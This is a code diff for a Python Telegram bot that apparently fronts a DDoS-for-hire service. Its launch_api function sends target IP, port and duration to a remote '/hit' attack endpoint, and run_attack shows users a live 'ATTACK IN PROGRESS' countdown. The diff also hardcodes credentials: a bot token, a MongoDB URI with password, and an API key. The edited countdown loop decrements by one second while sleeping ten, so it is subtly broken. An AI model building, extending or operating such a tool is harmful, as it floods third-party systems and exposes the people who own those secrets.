@@ -15,10 +15,10 @@ from dotenv import load_dotenv
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger(__name__)
 load_dotenv()
-BOT_TOKEN        = os.getenv("BOT_TOKEN", "8796126950:AAF_WP7YytyW45Zk7IArqzsDW5b3wGvtSDk")
+BOT_TOKEN        = os.getenv("BOT_TOKEN", "8796126950:AAGZFePhGS21K2eoeZr_FI8YnduKNTx3PyU")
 MONGODB_URI      = os.getenv("MONGODB_URI", "mongodb+srv://rocky:rocky8688@cluster0.hzpkek4.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0")
 DATABASE_NAME    = os.getenv("DATABASE_NAME", "rockybot")
-API_URL = os.getenv("API_URL", "http://203.57.85.87:8080")
+API_URL          = os.getenv("API_URL", "http://203.57.85.87:8080")
 API_KEY          = os.getenv("API_KEY", "ROCKY_API_KEY_2026")
 ADMIN_IDS        = [int(x.strip()) for x in os.getenv("ADMIN_IDS", "7340399575").split(",") if x.strip()]
 CHANNEL_ID       = os.getenv("CHANNEL_ID", "-1002558937048")
@@ -359,7 +359,7 @@ def launch_api(ip, port, dur):
         r = requests.get(
             f"{API_URL}/hit",
             params={"token": API_KEY, "ip": ip, "port": port, "time": dur},
-            timeout=300
+            timeout=30
         )
         logger.info(f"API Response [{r.status_code}]: {r.text[:300]}")
         if not r.text.strip():
@@ -385,7 +385,6 @@ async def check_joined(uid, ctx):
     try:
         m = await ctx.bot.get_chat_member(chat_id=int(CHANNEL_ID), user_id=uid)
         joined = m.status in ("member", "administrator", "creator")
-        
         return joined
     except Exception as e:
         logger.error(f"Channel check: {e}")
@@ -445,23 +444,22 @@ async def run_attack(update: Update, ctx: ContextTypes.DEFAULT_TYPE, uid: int, i
                 reply_markup=get_support_keyboard()
             )
             
-            # Live countdown loop - updates every 10 seconds
-            update_interval = 10
-            for remaining in range(actual_duration, -1, -update_interval):
+            # Live countdown loop
+            for remaining in range(actual_duration, -1, -1):
                 if remaining <= 0:
                     break
-
+                
                 elapsed = actual_duration - remaining
                 pct = int((elapsed / actual_duration) * 100)
                 if pct > 100: pct = 100
-
+                
                 filled = int(pct / 5)
                 bar = "█" * filled + "░" * (20 - filled)
-
+                
                 minutes = remaining // 60
                 seconds = remaining % 60
                 time_display = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"
-
+                
                 try:
                     await msg.edit_text(
                         f"⚡ *ATTACK IN PROGRESS* ⚡\n\n"
@@ -479,9 +477,9 @@ async def run_attack(update: Update, ctx: ContextTypes.DEFAULT_TYPE, uid: int, i
                     if "not modified" not in str(e).lower():
                         logger.error(f"Edit error: {e}")
                         break
-
-                await asyncio.sleep(update_interval)
-
+                
+                await asyncio.sleep(10)
+                
                 if uid not in active_attacks:
                     logger.info(f"Attack {attack_id} was manually stopped")
                     break
